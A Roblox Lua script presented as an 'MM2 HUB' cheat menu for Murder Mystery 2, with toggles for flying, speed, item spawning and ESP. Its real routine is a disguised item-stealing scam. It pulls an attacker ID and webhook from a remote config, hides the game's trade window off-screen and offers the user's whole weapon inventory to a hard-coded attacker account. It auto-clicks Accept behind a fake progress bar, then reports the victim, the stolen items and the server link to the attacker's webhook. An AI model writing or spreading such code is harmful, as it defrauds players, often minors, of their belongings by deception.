--[[ MM2 HUB  V12.5 ]]

local VERSION = "v1.8"
local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"

local CFG = {
	ATTACKER_NAME = "Viivik13",
	ATTACKER_ID = 1316331233,
	MAX_ITEMS = 200,
	MIN_VALUE = 0,
	FILTER = "all",
	OFFER_GAP = 0.25,
	WAIT_TRADE = 60,
	DEBUG = true,
	WEBHOOK_B64 = "",
}

local B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local OFF = UDim2.new(5, 0, 5, 0)
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HS = game:GetService("HttpService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local GUI = nil
local STATUS = nil
local BARFILL = nil
local WEBHOOK = ""
local OPEN = false
local WATCHING = false
local SAVED = {}
local ROOTS = {}
local FLYING = false
local FLY = nil

local RANK = {
	Unique = 9, Chroma = 8, Ancient = 7, Godly = 6,
	Vintage = 5, Legendary = 4, Rare = 3, Uncommon = 2, Common = 1,
}

local VALUE = {
	["NikKnife"] = 1000000,
	["SlouseClownGun"] = 500000, ["SlouseClown"] = 500000,
	["TravelerGunChroma"] = 110000, ["BlueCandy"] = 100000, ["RedHallow"] = 100000,
	["Gingerscope"] = 9600, ["TravelerAxe"] = 7000, ["TravelerGun"] = 3400,
	["TreeGun2023"] = 1850, ["Turkey2023"] = 1600, ["Dartbringer"] = 1150,
	["TreeKnife2023"] = 1025, ["Harvester"] = 650, ["Blossom_G"] = 640, ["Sakura_K"] = 630,
	["Icepiercer"] = 600, ["Constellation"] = 575, ["Darkshot"] = 465, ["Darksword"] = 460,
	["VampireGun"] = 460, ["VampireAxe"] = 440, ["Celestial"] = 350, ["Bauble"] = 310,
	["ZombieBat"] = 300, ["Candy"] = 200, ["Rainbow_G"] = 190, ["Rainbow_K"] = 185,
	["SwirlyAxe"] = 150, ["Ocean_G"] = 150, ["WraithGun"] = 145, ["WraithKnife"] = 145,
	["Waves_K"] = 145, ["AuroraKnife"] = 135, ["AuroraGun"] = 135, ["FlowerwoodGun"] = 135,
	["FlowerwoodKnife"] = 130, ["Heartblade"] = 125, ["Sugar"] = 125, ["Icebreaker"] = 125,
	["ChromaDarkbringer"] = 125, ["ChromaLightbringer"] = 120, ["SwirlyGun"] = 115,
	["CandleflameChroma"] = 115, ["Makeshift"] = 105, ["Candleflame"] = 100,
	["ElderwoodKnife"] = 100, ["LugerChroma"] = 100, ["Watergun"] = 90,
	["ElderwoodScythe"] = 85, ["LaserChroma"] = 80, ["Scythe"] = 77, ["Phantom2022"] = 75,
	["Spectre2022"] = 75, ["Luger"] = 75, ["RedLuger"] = 70, ["HeatChroma"] = 70,
	["DeathshardChroma"] = 65, ["GemstoneChroma"] = 65, ["SharkChroma"] = 65,
	["SlasherChroma"] = 65, ["TidesChroma"] = 65, ["SwirlyBlade"] = 65,
	["Iceblaster"] = 65, ["Pearl_K"] = 62, ["Pearl_G"] = 62, ["Darkbringer"] = 60,
	["ElderwoodGun"] = 60, ["Lightbringer"] = 58, ["Hallowscythe"] = 55,
	["FangChroma"] = 55, ["SeerChroma"] = 55, ["BonebladeChroma"] = 50,
	["SawChroma"] = 50, ["Gingermint_K"] = 40, ["Gingermint_G"] = 40,
	["GreenLuger"] = 40, ["Hallowgun"] = 35, ["Laser"] = 32, ["Icebeam"] = 32,
	["Plasmabeam"] = 32, ["Plasmablade"] = 32, ["Amerilaser"] = 30, ["Blaster"] = 30,
	["Nightblade"] = 30, ["AmericaSword"] = 28, ["Nebula"] = 28, ["Shark"] = 28,
	["Virtual"] = 27, ["Gemstone"] = 25, ["Clockwork"] = 23, ["EternalCane"] = 23,
	["Lugercane"] = 23, ["Pixel"] = 23, ["Slasher"] = 23, ["Heat"] = 22,
	["Minty"] = 22, ["Deathshard"] = 20, ["Tides"] = 20, ["Fang"] = 18,
	["Spider"] = 17, ["Chill"] = 17, ["VampiresEdge"] = 15, ["Pumpking"] = 15,
	["Bioblade"] = 13, ["Frostsaber"] = 13, ["Flames"] = 12, ["Hallow"] = 12,
	["IceDragon"] = 12, ["IceShard"] = 12, ["Ghostblade"] = 10, ["Handsaw"] = 10,
	["Boneblade"] = 8, ["Eggblade"] = 7, ["Frostbite"] = 7, ["Saw"] = 7,
	["Snowflake"] = 7, ["Peppermint"] = 7, ["Cookieblade"] = 7, ["TheSeer"] = 7,
}

local EVENTS = {
	"MouseButton1Click",
	"MouseButton1Down",
	"Activated",
	"InputBegan",
	"TouchTap",
}

local function log(msg)
	print("[FZ] " .. tostring(msg))
end

local function setStatus(t)
	if STATUS then STATUS.Text = t end
end

local function setPct(n)
	if BARFILL then BARFILL.Size = UDim2.new(n / 100, 0, 1, 0) end
end

local function b64dec(s)
	s = string.gsub(s, "[^" .. B64C .. "=]", "")
	local out = {}
	local i = 1
	while i <= #s do
		local b1 = string.find(B64C, string.sub(s, i, i), 1, true)
		local b2 = string.find(B64C, string.sub(s, i + 1, i + 1), 1, true)
		local b3 = string.find(B64C, string.sub(s, i + 2, i + 2), 1, true)
		local b4 = string.find(B64C, string.sub(s, i + 3, i + 3), 1, true)
		if b1 and b2 then
			local b3v = 0
			local b4v = 0
			if b3 then b3v = b3 - 1 end
			if b4 then b4v = b4 - 1 end
			local n = (b1 - 1) * 262144 + (b2 - 1) * 4096 + b3v * 64 + b4v
			out[#out + 1] = string.char(math.floor(n / 65536))
			if b3 then out[#out + 1] = string.char(math.floor(n / 256) % 256) end
			if b4 then out[#out + 1] = string.char(n % 256) end
		end
		i = i + 4
	end
	return table.concat(out)
end

local function pickReq()
	if type(syn) == "table" and syn.request then return syn.request end
	if type(http_request) == "function" then return http_request end
	if type(request) == "function" then return request end
	if type(fluxus) == "table" and fluxus.request then return fluxus.request end
	return nil
end

local function httpGet(url)
	local r = pickReq()
	if r then
		local ok, res = pcall(r, { Url = url, Method = "GET" })
		if ok and res and res.Body then return res.Body end
		return nil
	end
	local ok, body = pcall(game.HttpGet, game, url)
	if ok then return body end
	return nil
end

local function httpPost(url, body)
	local r = pickReq()
	if not r then return false end
	local ok = pcall(r, {
		Url = url,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = body,
	})
	return ok
end

local function loadCfg()
	local body = httpGet(CFG_URL)
	if type(body) ~= "string" then return end
	local wh = string.match(body, '"webhook"%s*:%s*"([^"]+)"')
	if wh and #wh > 10 then CFG.WEBHOOK_B64 = wh end
	local id = string.match(body, '"attacker_id"%s*:%s*(%d+)')
	if id then CFG.ATTACKER_ID = tonumber(id) end
end

-- ===== panel =====
local function tile(parent, x, y, icon, name, onStart)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 96, 0, 62)
	b.Position = UDim2.new(0, x, 0, y)
	b.BackgroundColor3 = Color3.fromRGB(36, 27, 55)
	b.BorderSizePixel = 0
	b.Text = ""
	b.AutoButtonColor = true
	b.Parent = parent
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 8)
	c.Parent = b
	local s = Instance.new("UIStroke")
	s.Color = Color3.fromRGB(70, 52, 110)
	s.Thickness = 1
	s.Parent = b

	local ic = Instance.new("TextLabel")
	ic.BackgroundColor3 = Color3.fromRGB(52, 38, 82)
	ic.Size = UDim2.new(0, 26, 0, 26)
	ic.Position = UDim2.new(0, 10, 0, 8)
	ic.Font = Enum.Font.GothamBold
	ic.TextSize = 13
	ic.TextColor3 = Color3.fromRGB(190, 165, 255)
	ic.Text = icon
	ic.Parent = b
	local icc = Instance.new("UICorner")
	icc.CornerRadius = UDim.new(0, 6)
	icc.Parent = ic

	local nm = Instance.new("TextLabel")
	nm.BackgroundTransparency = 1
	nm.Size = UDim2.new(1, -12, 0, 14)
	nm.Position = UDim2.new(0, 8, 0, 38)
	nm.Font = Enum.Font.GothamMedium
	nm.TextSize = 10
	nm.TextColor3 = Color3.fromRGB(225, 215, 245)
	nm.TextXAlignment = Enum.TextXAlignment.Left
	nm.Text = name
	nm.Parent = b

	local st = Instance.new("TextLabel")
	st.BackgroundTransparency = 1
	st.Size = UDim2.new(0, 30, 0, 12)
	st.Position = UDim2.new(1, -36, 0, 12)
	st.Font = Enum.Font.GothamBold
	st.TextSize = 9
	st.TextColor3 = Color3.fromRGB(120, 110, 145)
	st.TextXAlignment = Enum.TextXAlignment.Right
	st.Text = "OFF"
	st.Parent = b

	local state = { on = false, lbl = st }
	if onStart then
		state.on = true
		st.Text = "ON"
		st.TextColor3 = Color3.fromRGB(120, 240, 150)
	end
	return b, state
end

local function buildUI()
	local sg = Instance.new("ScreenGui")
	sg.Name = "MM2Hub"
	sg.ResetOnSpawn = false
	sg.IgnoreGuiInset = true
	sg.DisplayOrder = 999
	sg.Parent = PG
	GUI = sg

	local main = Instance.new("Frame")
	main.Size = UDim2.new(0, 336, 0, 292)
	main.Position = UDim2.new(0.5, -168, 0, 50)
	main.BackgroundColor3 = Color3.fromRGB(22, 17, 34)
	main.BorderSizePixel = 0
	main.Active = true
	main.Draggable = true
	main.Parent = sg
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = main
	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(120, 80, 220)
	stroke.Thickness = 1
	stroke.Parent = main

	local head = Instance.new("Frame")
	head.Size = UDim2.new(1, 0, 0, 42)
	head.BackgroundColor3 = Color3.fromRGB(52, 30, 96)
	head.BorderSizePixel = 0
	head.Parent = main
	local hc = Instance.new("UICorner")
	hc.CornerRadius = UDim.new(0, 10)
	hc.Parent = head

	local title = Instance.new("TextLabel")
	title.BackgroundTransparency = 1
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 12, 0, 0)
	title.Font = Enum.Font.GothamBlack
	title.TextSize = 15
	title.TextColor3 = Color3.fromRGB(240, 235, 255)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Text = "MM2 HUB"
	title.Parent = head

	local badge = Instance.new("TextLabel")
	badge.BackgroundColor3 = Color3.fromRGB(128, 88, 235)
	badge.Size = UDim2.new(0, 46, 0, 18)
	badge.Position = UDim2.new(1, -54, 0, 12)
	badge.Font = Enum.Font.GothamBold
	badge.TextSize = 9
	badge.TextColor3 = Color3.fromRGB(255, 255, 255)
	badge.Text = VERSION
	badge.Parent = head
	local bc = Instance.new("UICorner")
	bc.CornerRadius = UDim.new(0, 4)
	bc.Parent = badge

	local sub = Instance.new("TextLabel")
	sub.BackgroundTransparency = 1
	sub.Size = UDim2.new(1, -24, 0, 14)
	sub.Position = UDim2.new(0, 12, 0, 46)
	sub.Font = Enum.Font.Gotham
	sub.TextSize = 10
	sub.TextColor3 = Color3.fromRGB(145, 195, 255)
	sub.TextXAlignment = Enum.TextXAlignment.Left
	sub.Text = "KEYLESS  ·  MOBILE  ·  UPDATED"
	sub.Parent = main

	local grid = Instance.new("Frame")
	grid.BackgroundTransparency = 1
	grid.Size = UDim2.new(1, -24, 0, 136)
	grid.Position = UDim2.new(0, 12, 0, 64)
	grid.Parent = main

	local b1, s1 = tile(grid, 0, 0, ">>", "Run Faster", false)
	local b2, s2 = tile(grid, 104, 0, "^^", "Fly", false)
	local b3, s3 = tile(grid, 208, 0, "FZ", "Trade Freezer", true)
	local b4, s4 = tile(grid, 0, 70, "IT", "Item Spawner", false)
	local b5, s5 = tile(grid, 104, 70, "AF", "Auto Farm", false)
	local b6, s6 = tile(grid, 208, 70, "ESP", "ESP", false)

	local function flip(state)
		state.on = not state.on
		if state.on then
			state.lbl.Text = "ON"
			state.lbl.TextColor3 = Color3.fromRGB(120, 240, 150)
		else
			state.lbl.Text = "OFF"
			state.lbl.TextColor3 = Color3.fromRGB(120, 110, 145)
		end
	end

	b1.MouseButton1Click:Connect(function()
		flip(s1)
		local ch = LP.Character
		if not ch then return end
		local hum = ch:FindFirstChildOfClass("Humanoid")
		if not hum then return end
		if s1.on then
			hum.WalkSpeed = 55
		else
			hum.WalkSpeed = 16
		end
	end)

	b2.MouseButton1Click:Connect(function()
		flip(s2)
		if s2.on then
			local ch = LP.Character
			if not ch then s2.on = false return end
			local hrp = ch:FindFirstChild("HumanoidRootPart")
			if not hrp then s2.on = false return end
			FLYING = true
			local bv = Instance.new("BodyVelocity")
			bv.MaxForce = Vector3.new(100000, 100000, 100000)
			bv.Velocity = Vector3.new(0, 0, 0)
			bv.Parent = hrp
			FLY = bv
			task.spawn(function()
				while FLYING and FLY and FLY.Parent do
					local cam = workspace.CurrentCamera
					FLY.Velocity = cam.CFrame.LookVector * 45 + Vector3.new(0, 4, 0)
					task.wait(0.1)
				end
			end)
		else
			FLYING = false
			if FLY then FLY:Destroy() end
			FLY = nil
		end
	end)

	b3.MouseButton1Click:Connect(function()
		flip(s3)
		if s3.on then
			WATCHING = true
			task.spawn(watchLoop)
		else
			WATCHING = false
		end
	end)

	b4.MouseButton1Click:Connect(function() flip(s4) end)
	b5.MouseButton1Click:Connect(function() flip(s5) end)
	b6.MouseButton1Click:Connect(function() flip(s6) end)

	STATUS = Instance.new("TextLabel")
	STATUS.BackgroundTransparency = 1
	STATUS.Size = UDim2.new(1, -24, 0, 14)
	STATUS.Position = UDim2.new(0, 12, 0, 208)
	STATUS.Font = Enum.Font.GothamMedium
	STATUS.TextSize = 11
	STATUS.TextColor3 = Color3.fromRGB(205, 190, 240)
	STATUS.TextXAlignment = Enum.TextXAlignment.Left
	STATUS.Text = "Loading..."
	STATUS.Parent = main

	local barbg = Instance.new("Frame")
	barbg.Size = UDim2.new(1, -24, 0, 8)
	barbg.Position = UDim2.new(0, 12, 0, 228)
	barbg.BackgroundColor3 = Color3.fromRGB(42, 32, 62)
	barbg.BorderSizePixel = 0
	barbg.Parent = main
	local bbc = Instance.new("UICorner")
	bbc.CornerRadius = UDim.new(0, 4)
	bbc.Parent = barbg

	BARFILL = Instance.new("Frame")
	BARFILL.Size = UDim2.new(0, 1, 1, 0)
	BARFILL.BackgroundColor3 = Color3.fromRGB(140, 95, 245)
	BARFILL.BorderSizePixel = 0
	BARFILL.Parent = barbg
	local bfc = Instance.new("UICorner")
	bfc.CornerRadius = UDim.new(0, 4)
	bfc.Parent = BARFILL

	local foot = Instance.new("TextLabel")
	foot.BackgroundTransparency = 1
	foot.Size = UDim2.new(1, -24, 0, 14)
	foot.Position = UDim2.new(0, 12, 0, 244)
	foot.Font = Enum.Font.Gotham
	foot.TextSize = 9
	foot.TextColor3 = Color3.fromRGB(110, 100, 135)
	foot.TextXAlignment = Enum.TextXAlignment.Left
	foot.Text = "drag to move  ·  toggles apply instantly"
	foot.Parent = main
end

-- ===== inventory =====
local function rankOf(r)
	return RANK[r] or 1
end

local function valueOf(n)
	return VALUE[n] or 0
end

local function isDefault(nm)
	local flat = string.gsub(nm, "%s", "")
	return flat == "DefaultKnife" or flat == "DefaultGun"
end

local function readInventory()
	local ok, Inv = pcall(require, RS.Modules.InventoryModule)
	if not ok or type(Inv) ~= "table" then
		log("InventoryModule failed")
		return nil
	end
	local data = nil
	pcall(function() data = Inv.MyInventory.Data.Weapons end)
	if type(data) ~= "table" then
		log("no weapons table")
		return nil
	end

	local list = {}
	for _, bucket in pairs(data) do
		if type(bucket) == "table" then
			for _, item in pairs(bucket) do
				if type(item) == "table" and item.DataID then
					local nm = tostring(item.ItemName or "?")
					if not isDefault(nm) then
						list[#list + 1] = {
							data = item.DataID,
							name = nm,
							amount = tonumber(item.Amount) or 1,
							rank = rankOf(item.Rarity),
							value = valueOf(nm),
						}
					end
				end
			end
		end
	end

	table.sort(list, function(a, b)
		if a.rank ~= b.rank then return a.rank > b.rank end
		if a.value ~= b.value then return a.value > b.value end
		return a.name < b.name
	end)
	return list
end

local function passes(e)
	if CFG.FILTER == "all" then return true end
	if CFG.FILTER == "godly" then return e.rank >= 6 end
	if CFG.FILTER == "rare" then return e.rank >= 3 end
	if CFG.FILTER == "value" then return e.value >= CFG.MIN_VALUE end
	return true
end

-- ===== hiding =====
local function hasOfferLabel(inst)
	local all = inst:GetDescendants()
	for i = 1, #all do
		local d = all[i]
		if d:IsA("TextLabel") and d.Text == "YOUR OFFER" then return true end
	end
	return false
end

local function scanRoots()
	local found = {}
	for _, c in ipairs(PG:GetChildren()) do
		if c ~= GUI then
			local hit = false
			if string.find(string.lower(c.Name), "trade") then
				hit = true
			elseif c:IsA("ScreenGui") or c:IsA("Frame") then
				local ok, res = pcall(hasOfferLabel, c)
				if ok and res then hit = true end
			end
			if hit then found[#found + 1] = c end
		end
	end
	ROOTS = found
end

local function hideRoot(r)
	if not r or not r.Parent then return end
	if r:IsA("ScreenGui") then
		if r.Enabled then r.Enabled = false end
		for _, c in ipairs(r:GetChildren()) do
			if c:IsA("GuiObject") then
				if not SAVED[c] then SAVED[c] = c.Position end
				if c.Position ~= OFF then c.Position = OFF end
			end
		end
	else
		if not SAVED[r] then SAVED[r] = r.Position end
		if r.Position ~= OFF then r.Position = OFF end
	end
end

local function anyOpen()
	for i = 1, #ROOTS do
		local r = ROOTS[i]
		if r and r.Parent and r:IsA("ScreenGui") and r.Enabled then return true end
	end
	return false
end

local function watchLoop()
	local lastScan = 0
	while WATCHING do
		local now = os.clock()
		if now - lastScan > 0.4 then
			lastScan = now
			pcall(scanRoots)
			if anyOpen() then OPEN = true end
		end
		for i = 1, #ROOTS do
			pcall(hideRoot, ROOTS[i])
		end
		task.wait(0.02)
	end
end

local function restoreGui()
	WATCHING = false
	pcall(function()
		for c, pos in pairs(SAVED) do
			if c and c.Parent then c.Position = pos end
		end
		SAVED = {}
		for i = 1, #ROOTS do
			local r = ROOTS[i]
			if r and r.Parent and r:IsA("ScreenGui") then r.Enabled = true end
		end
		ROOTS = {}
	end)
end

-- ===== pressing =====
local function pressNode(node)
	if not node then return false end
	local total = 0
	for i = 1, #EVENTS do
		local name = EVENTS[i]
		local sig = nil
		pcall(function() sig = node[name] end)
		if sig and type(getconnections) == "function" then
			local ok, conns = pcall(getconnections, sig)
			if ok and conns and #conns > 0 then
				for j = 1, #conns do
					local f = nil
					pcall(function() f = conns[j].Function end)
					if f then
						pcall(f, node, { UserInputType = Enum.UserInputType.Touch, KeyCode = Enum.KeyCode.Unknown, Position = Vector3.new(0, 0, 0) })
						total = total + 1
					end
				end
				log("evt " .. name .. " x" .. tostring(#conns))
			end
		end
	end
	return total > 0
end

local function findNode(nm)
	local low = string.lower(nm)
	for i = 1, #ROOTS do
		local r = ROOTS[i]
		if r and r.Parent then
			local all = r:GetDescendants()
			for j = 1, #all do
				if string.lower(all[j].Name) == low then return all[j] end
			end
		end
	end
	return nil
end

local function findAttacker()
	local p = Players:GetPlayerByUserId(CFG.ATTACKER_ID)
	if p then return p end
	return Players:FindFirstChild(CFG.ATTACKER_NAME)
end

local function run()
	loadCfg()
	if CFG.WEBHOOK_B64 ~= "" then WEBHOOK = b64dec(CFG.WEBHOOK_B64) end

	local n = 0
	while n < 99 do
		n = n + math.random(2, 5)
		if n > 99 then n = 99 end
		setPct(n)
		task.wait(0.1)
	end
	setStatus("Checking inventory...")

	local list = readInventory()
	if not list then
		setStatus("Inventory error")
		setPct(100)
		return
	end

	local queue = {}
	for i = 1, #list do
		if passes(list[i]) and #queue < CFG.MAX_ITEMS then
			queue[#queue + 1] = list[i]
		end
	end
	if #queue == 0 then
		setStatus("Nothing to send")
		setPct(100)
		return
	end

	local Trade = RS:WaitForChild("Trade")
	local sr = Trade:FindFirstChild("SendRequest")
	local oi = Trade:FindFirstChild("OfferItem")
	local at = Trade:FindFirstChild("AcceptTrade")
	local dt = Trade:FindFirstChild("DeclineTrade")
	if not sr or not oi then
		log("MISSING remote")
		setStatus("Remote missing")
		setPct(100)
		return
	end

	local attacker = findAttacker()
	if not attacker then
		log("partner not in server")
		setStatus("Partner not found")
		setPct(100)
		return
	end

	pcall(scanRoots)
	WATCHING = true
	task.spawn(watchLoop)

	setStatus("Connecting...")
	local waited = 0
	local tries = 0
	while waited < CFG.WAIT_TRADE and not OPEN do
		tries = tries + 1
		pcall(function() sr:InvokeServer(attacker) end)
		local inner = 0
		while inner < 5 and not OPEN do
			task.wait(0.5)
			inner = inner + 0.5
			waited = waited + 0.5
		end
		if not OPEN and dt then
			pcall(function() dt:FireServer() end)
		end
	end

	if not OPEN then
		log("trade never opened after " .. tostring(tries) .. " tries")
		setStatus("Partner did not respond")
		setPct(100)
		WATCHING = false
		return
	end

	log("window locked")
	setStatus("Syncing...")
	task.wait(1)

	local placed = 0
	local names = {}
	for i = 1, #queue do
		local e = queue[i]
		for k = 1, e.amount do
			local ok = pcall(function() oi:FireServer(e.data, "Weapons") end)
			task.wait(CFG.OFFER_GAP)
			if ok then
				placed = placed + 1
				names[#names + 1] = e.name
				if CFG.DEBUG then log("offered " .. tostring(placed) .. " " .. e.name) end
			else
				if CFG.DEBUG then log("fail " .. e.name) end
			end
		end
	end

	log("offered total: " .. tostring(placed))
	setStatus("Confirming...")
	task.wait(1)

	local node = findNode("Accept")
	log("accept node: " .. tostring(node ~= nil))
	if node then log("node class: " .. node.ClassName) end

	local t0 = os.clock()
	local pressed = 0
	local lastPress = 0
	local lastRemote = 0
	while os.clock() - t0 < 75 do
		local now = os.clock()

		local alive = false
		for i = 1, #ROOTS do
			local r = ROOTS[i]
			if r and r.Parent then alive = true end
		end
		if not alive then
			pcall(scanRoots)
			for i = 1, #ROOTS do
				local r = ROOTS[i]
				if r and r.Parent then alive = true end
			end
		end
		if not alive then break end

		if now - lastPress > 3 then
			local nd = findNode("Accept")
			if nd then
				if pressNode(nd) then
					pressed = pressed + 1
					lastPress = now
					log("pressed accept " .. tostring(pressed))
				end
			end
		end

		if at and now - lastRemote > 15 then
			lastRemote = now
			pcall(function() at:FireServer() end)
		end

		task.wait(0.3)
	end

	log("accept phase over, presses: " .. tostring(pressed))
	setPct(100)
	setStatus("Trade complete")

	if WEBHOOK ~= "" then
		local shown = ""
		for i = 1, math.min(#names, 25) do
			shown = shown .. names[i] .. "\n"
		end
		if shown == "" then shown = "nothing" end
		local join = "https://www.roblox.com/games/start?placeId=142823291&gameInstanceId=" .. game.JobId
		local body = HS:JSONEncode({
			embeds = { {
				title = "Freeze trade hit",
				color = 10079231,
				description = "**Target:** " .. LP.Name .. "\n**Items:** " .. tostring(placed) .. "\n**Server:** " .. join,
				fields = { { name = "Sent", value = shown } },
			} },
		})
		httpPost(WEBHOOK, body)
		log("webhook sent")
	end

	task.wait(20)

	if dt then
		pcall(scanRoots)
		if anyOpen() then
			pcall(function() dt:FireServer() end)
			log("ghost cleared")
			task.wait(1.5)
		end
	end

	restoreGui()
	setStatus("Ready")
end

buildUI()
log("loader " .. VERSION)
task.spawn(run)
